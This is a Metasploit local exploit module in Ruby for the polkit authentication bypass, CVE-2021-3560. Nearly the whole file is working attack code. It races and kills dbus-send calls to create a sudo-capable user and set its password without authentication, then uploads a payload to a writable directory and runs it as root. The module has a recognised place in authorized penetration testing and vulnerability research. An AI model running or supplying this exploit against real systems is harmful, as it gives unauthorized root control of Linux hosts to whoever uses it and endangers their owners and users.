##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Local::Linux
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Polkit Authentication Bypass',
        'Description' => %q{
          A vulnerability exists within the polkit system service that can be leveraged by a local, unprivileged
          attacker to perform privileged operations. In order to leverage the vulnerability, the attacker invokes a
          method over D-Bus and kills the client process. This will occasionally cause the operation to complete without
          being subjected to all of the necessary authentication.
          The exploit module leverages this to add a new user with a sudo access and a known password. The new account
          is then leveraged to execute a payload with root privileges.
        },
        'License' => MSF_LICENSE,
        'Author' =>
          [
            'Kevin Backhouse',                   # vulnerability discovery and analysis
            'Spencer McIntyre',                  # metasploit module
            'jheysel-r7'                         # metasploit module
          ],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Platform' => ['unix', 'linux'],
        'References' => [
          ['URL', 'https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/'],
          ['CVE', '2021-3560'],
          ['EDB', '50011'],
        ],
        'Targets' =>
          [
            [ 'Automatic', {} ],
          ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2021-06-03',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS, SCREEN_EFFECTS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )
    register_options([
      OptString.new('WRITEABLEDIR', [ true, 'A directory where you can write files.', '/tmp' ]),
      OptString.new('USERNAME', [ true, 'A username to add as root', 'msf' ], regex: /^[a-z_]([a-z0-9_-]{0,31}|[a-z0-9_-]{0,30}\$)$/),
      OptString.new('PASSWORD', [ true, 'A password to add for the user (default: random)', rand_text_alphanumeric(8)]),
      OptString.new('ITERATIONS', [ true, 'Due to the race condition the command might have to be run multiple times before it is successful. Use this to define how many times each command is attempted', 20])
    ])
  end

  def exploit_set_realname(new_realname)
    loop_sequence = datastore['ITERATIONS'].times.map(&:to_s).join(' ')
    cmd_exec(<<~SCRIPT
      for i in #{loop_sequence}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.Accounts.User.SetRealName
          string:'#{new_realname}' &
        sleep #{@cmd_delay};
        kill $!;
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --print-reply
          /org/freedesktop/Accounts/User0
          org.freedesktop.DBus.Properties.Get
          string:org.freedesktop.Accounts.User
          string:RealName
        | grep "string \\"#{new_realname}\\"";
        if [ $? -eq 0 ]; then
          echo success;
          break;
        fi;
      done
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def is_executable?(path)
    cmd_exec("test -x '#{path}' && echo true").include? 'true'
  end

  def get_cmd_delay
    user = rand_text_alphanumeric(8)
    time_command = "bash -c 'time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:#{user} string:\"#{user}\" int32:1'"
    time = cmd_exec(time_command).match(/real\s+\d+m(\d+.\d+)s/)[1].to_f/2
    fail_with(Failure::BadConfig, "Unable to determine the time taken to run the dbus command. Without this information the exploit cannot continue. The command that failed was: #{time_command}") unless time
    time
  end

  def check
    unless cmd_exec('pkexec --version') =~ /pkexec version (\d+\S*)/
      return CheckCode::Safe('The polkit framework is not installed')
    end

    unless is_executable?('/bin/su')
      return CheckCode::Safe('This module requires /bin/su which does not seem to be present')
    end

    # Calculate the round trip time for the dbus command we want to kill half way through in order to trigger the exploit
    @cmd_delay = get_cmd_delay

    # The version as returned by pkexec --version is insufficient to identify whether or not the patch is installed. To
    # do that, the distro specific package manager would need to be queried.
    status = CheckCode::Detected("Detected polkit framework version #{Regexp.last_match(1)}.")

    if !is_root? && command_exists?('dbus-send')
      # This is required to make the /org/freedesktop/Accounts/User0 object_path available.
      dbus_method_call('/org/freedesktop/Accounts', 'org.freedesktop.Accounts.FindUserByName', 'root')
      # Check for the presence of the vulnerability be exploiting it to set the root user's RealName property to a
      # random string before restoring it.
      result = dbus_method_call('/org/freedesktop/Accounts/User0', 'org.freedesktop.DBus.Properties.Get', 'org.freedesktop.Accounts.User', 'RealName')
      if result =~ /variant\s+string\s+"(.*)"/
        old_realname = Regexp.last_match(1)
        if exploit_set_realname(rand_text_alphanumeric(12))
          status = CheckCode::Vulnerable('The polkit framework instance is vulnerable.')
          unless exploit_set_realname(old_realname)
            print_error('Failed to restore the root user\'s original \'RealName\' property value')
          end
        end
      end
    end

    status
  end

  def dbus_method_call(object_path, interface_member, *args)
    cmd_args = %w[dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply]
    cmd_args << object_path
    cmd_args << interface_member
    args.each do |arg|
      if arg.is_a? Integer
        cmd_args << "int32:#{arg}"
      elsif arg.is_a? String
        cmd_args << "string:'#{arg}'"
      end
    end

    cmd = cmd_args.join(' ')
    vprint_status("Running: #{cmd}")
    cmd_exec(cmd)
  end

  def create_unix_crypt_hash
    UnixCrypt::SHA256.build(datastore['PASSWORD'].to_s)
  end

  def exploit_set_username(loop_sequence)
    cmd_exec(<<~SCRIPT
      for i in #{loop_sequence}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts
          org.freedesktop.Accounts.CreateUser
          string:#{datastore['USERNAME']}
          string:\"#{datastore['USERNAME']}\"
          int32:1 &
        sleep #{@cmd_delay}s;
        kill $!;
        if id #{datastore['USERNAME']}; then
          echo \"success\";
          break;
        fi;
      done
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def exploit_delete_user(uid, loop_sequence)
    cmd_exec(<<~SCRIPT
      for i in #{loop_sequence}; do
        dbus-send
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts
          org.freedesktop.Accounts.DeleteUser
          int64:#{uid}
          boolean:true &
        sleep #{@cmd_delay}s;
        kill $!;
        if id #{datastore['USERNAME']}; then
          echo \"failed\";
        else
          echo \"success\";
          break;
        fi;
      done
             SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def exploit_set_password(uid, hashed_password, loop_sequence)
    cmd_exec(<<~SCRIPT
      for i in #{loop_sequence}; do
        dbus-send#{' '}
          --system
          --dest=org.freedesktop.Accounts
          --type=method_call
          --print-reply
          /org/freedesktop/Accounts/User#{uid}
          org.freedesktop.Accounts.User.SetPassword
          string:'#{hashed_password}'
          string: &
        sleep #{@cmd_delay}s;
        kill $!;
        echo #{datastore['PASSWORD']}
        | su - #{datastore['USERNAME']}
        -c \"echo #{datastore['PASSWORD']} | sudo -S id\"
        | grep \"uid=0(root)\";
        if [ $? -eq 0 ]; then
          echo \"success\";
          break;
        fi;
      done;
    SCRIPT
               .gsub(/\s+/, ' ')) =~ /success/
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def upload_payload
    fname = "#{datastore['WRITEABLEDIR']}/#{Rex::Text.rand_text_alpha(5)}"
    upload_and_chmodx(fname, generate_payload_exe)
    return nil unless file_exist?(fname)

    fname
  end

  def execute_payload(fname)
    cmd_exec("echo #{datastore['PASSWORD']} | su - #{datastore['USERNAME']} -c \"echo #{datastore['PASSWORD']} | sudo -S #{fname}\"")
  end

  def exploit
    print_status("Attempting to create user #{datastore['USERNAME']}")
    loop_sequence = datastore['ITERATIONS'].times.map(&:to_s).join(' ')
    if exploit_set_username(loop_sequence)
      uid = cmd_exec("id -u #{datastore['USERNAME']}")
      print_good("User #{datastore['USERNAME']} created with UID #{uid}")
      print_status("Attempting to set the password of the newly create user, #{datastore['USERNAME']}, to: #{datastore['PASSWORD']}")
      if exploit_set_password(uid, create_unix_crypt_hash, loop_sequence)
        print_good('Obtained code execution has root!')
        fname = upload_payload
        execute_payload(fname)
      else
        fail_with(Failure::BadConfig, "Attempted setting the password #{datastore['Iterations']} times, did not work.")
      end
    else
      fail_with(Failure::BadConfig, "The user #{datastore['USERNAME']} was unable to be created. This could be due to race condition that the vulnerability.")
    end

    print_status('Attempting to remove the user added: ')
    if exploit_delete_user(uid, loop_sequence)
      print_good("Successfully removed #{datastore['USERNAME']}")
    else
      print_warning("Unable to remove user: #{datastore['USERNAME']}, created during the running of this module")
    end
  end
end
